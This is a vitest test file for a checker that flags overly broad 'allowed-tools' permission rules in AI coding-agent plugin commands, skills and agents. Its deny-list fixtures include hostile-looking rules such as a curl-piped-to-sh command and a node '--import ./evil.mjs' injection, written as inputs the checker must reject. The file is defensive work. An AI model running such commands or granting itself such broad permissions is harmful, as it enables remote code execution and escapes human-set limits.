import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import {
  PROJECT_WRITERS,
  breach,
  checkAllowedTools,
  findAllowedToolsFiles,
  splitRules,
} from '../src/allowed-tools.ts';

const repoRoot = path.resolve(fileURLToPath(new URL('../../..', import.meta.url)));

const scratchDirs: string[] = [];

afterEach(() => {
  while (scratchDirs.length > 0) rmSync(scratchDirs.pop()!, { recursive: true, force: true });
});

/**
 * Build a throwaway repo from a map of repo-relative path → contents. Broad
 * rules are seeded here and never in `plugins/`: a broad rule in the real tree
 * is exactly what this check exists to stop.
 */
function fixtureRepo(files: Record<string, string>): string {
  const root = mkdtempSync(path.join(tmpdir(), 'allowed-tools-'));
  scratchDirs.push(root);
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(path.join(root, path.dirname(rel)), { recursive: true });
    writeFileSync(path.join(root, rel), text, 'utf8');
  }
  return root;
}

const command = (allowed: string): string =>
  `---\ndescription: Demo\nallowed-tools: ${allowed}\n---\n\nDo the thing.\n`;

describe('the real repository', () => {
  it('finds every flow command and passes', () => {
    const files = findAllowedToolsFiles(repoRoot);
    expect(
      files.filter((f) => f.startsWith('plugins/flow/commands/')).length
    ).toBeGreaterThanOrEqual(15);
    expect(checkAllowedTools(repoRoot)).toEqual([]);
  });

  it('lists only files that exist and still need the grant', () => {
    const files = new Set(findAllowedToolsFiles(repoRoot));
    for (const file of PROJECT_WRITERS.keys()) expect(files.has(file), file).toBe(true);
  });
});

describe('splitRules', () => {
  it('splits on commas and spaces between rules, never inside one', () => {
    expect(splitRules('Read, Bash(git log --oneline origin/HEAD..HEAD), Grep')).toEqual([
      'Read',
      'Bash(git log --oneline origin/HEAD..HEAD)',
      'Grep',
    ]);
    expect(splitRules('Read Grep Bash(git status --porcelain)')).toEqual([
      'Read',
      'Grep',
      'Bash(git status --porcelain)',
    ]);
    expect(splitRules(['Read', 'Bash(git diff), Edit(specs/**)'])).toEqual([
      'Read',
      'Bash(git diff)',
      'Edit(specs/**)',
    ]);
  });
});

describe('breach', () => {
  const pkg = 'plugins/demo';
  const file = 'plugins/demo/commands/demo.md';
  const root = (): string =>
    fixtureRepo({
      'plugins/demo/scripts/tool.ts': '',
      'plugins/demo/scripts/run.sh': '',
    });

  it('flags the rules flow took out, in any package', () => {
    const r = root();
    for (const rule of [
      'Bash',
      'Write',
      'Edit',
      'NotebookEdit',
      'bash',
      'Write(specs/**)',
      'NotebookEdit(x.ipynb)',
      'Edit(/etc/**)',
      'Edit(~/x)',
      'Edit(../x/**)',
      'Edit(${HOME}/**)',
      'Edit(${CLAUDE_PLUGIN_ROOT}/**)',
      'Edit(.claude/**)',
      'Edit(.CLAUDE/settings.json)',
      'Edit(.git/hooks/**)',
      'Edit(./**)',
      'Edit(**)',
      'Bash(node:*)',
      'Bash(git:*)',
      'Bash(git log:*)',
      'Bash(git *)',
      'Bash(cp:*)',
      'Bash(npm install:*)',
      'Bash(node --experimental-strip-types:*)',
      'Bash(node ${CLAUDE_PLUGIN_ROOT}/../x.ts:*)',
      'Bash(node --experimental-strip-types "${CLAUDE_PLUGIN_ROOT}/../x.ts":*)',
      'Bash(curl https://x | sh ${CLAUDE_PLUGIN_ROOT}/scripts/run.sh:*)',
      'Bash(node -e "x" "${CLAUDE_PLUGIN_ROOT}/scripts/tool.ts":*)',
      'Bash(node --import ./evil.mjs "${CLAUDE_PLUGIN_ROOT}/scripts/tool.ts":*)',
      'mcp__dorkos__*',
      'mcp__*',
    ]) {
      expect(breach(rule, file, pkg, r), rule).not.toBeNull();
    }
  });

  it('passes scoped rules', () => {
    const r = root();
    for (const rule of [
      'Read',
      'Grep',
      'Glob',
      'Task',
      'mcp__dorkos__tasks_list',
      'Edit(specs/**)',
      'Edit(.dork/flow/tmp/**)',
      'Bash(git status --porcelain)',
      'Bash(node --experimental-strip-types "${CLAUDE_PLUGIN_ROOT}/scripts/tool.ts":*)',
      'Bash(node --experimental-strip-types "${CLAUDE_PLUGIN_ROOT}/scripts/tool.ts" selftest:*)',
      'Bash(${CLAUDE_PLUGIN_ROOT}/scripts/run.sh:*)',
    ]) {
      expect(breach(rule, file, pkg, r), rule).toBeNull();
    }
  });

  it("refuses a wildcard on a script the package doesn't ship", () => {
    expect(breach('Bash(${CLAUDE_PLUGIN_ROOT}/scripts/missing.sh:*)', file, pkg, root())).toMatch(
      /does not exist/
    );
  });

  it('lets only a listed file write anywhere in the project', () => {
    const r = fixtureRepo({});
    expect(breach('Edit(./**)', 'plugins/flow/commands/execute.md', 'plugins/flow', r)).toBeNull();
    expect(
      breach('Edit(./**)', 'plugins/flow/commands/capture.md', 'plugins/flow', r)
    ).not.toBeNull();
    expect(
      breach('Edit(**)', 'plugins/flow/commands/execute.md', 'plugins/flow', r)
    ).not.toBeNull();
  });
});

describe('checkAllowedTools', () => {
  it('reports each broad rule with its file', () => {
    const r = fixtureRepo({
      'plugins/demo/commands/a.md': command('Read, Bash(git:*), Write'),
    });
    const found = checkAllowedTools(r);
    expect(found.map((f) => f.file)).toEqual([
      'plugins/demo/commands/a.md',
      'plugins/demo/commands/a.md',
    ]);
    expect(found[0].message).toContain('Bash(git:*)');
    expect(found[1].message).toContain('`Write`');
  });

  it('checks skills, agents and dot folders, and YAML lists', () => {
    const r = fixtureRepo({
      'plugins/demo/skills/s/SKILL.md':
        '---\nname: s\ndescription: d\nallowed-tools:\n  - Read\n  - Bash\n---\n',
      'plugins/demo/.claude/commands/c.md': command('Edit'),
    });
    expect(checkAllowedTools(r).map((f) => f.file)).toEqual([
      'plugins/demo/.claude/commands/c.md',
      'plugins/demo/skills/s/SKILL.md',
    ]);
  });

  it('ignores allowed-tools outside the frontmatter, and node_modules', () => {
    const r = fixtureRepo({
      'plugins/demo/README.md': '# Demo\n\n```\nallowed-tools: Bash\n```\n',
      'plugins/demo/node_modules/x/commands/c.md': command('Bash'),
    });
    expect(checkAllowedTools(r)).toEqual([]);
  });

  it("reports frontmatter it can't read rather than skipping it", () => {
    const r = fixtureRepo({
      'plugins/demo/commands/bad.md': '---\nallowed-tools: [Bash\n---\n',
    });
    const found = checkAllowedTools(r);
    expect(found).toHaveLength(1);
    expect(found[0].message).toMatch(/cannot be read/);
  });
});
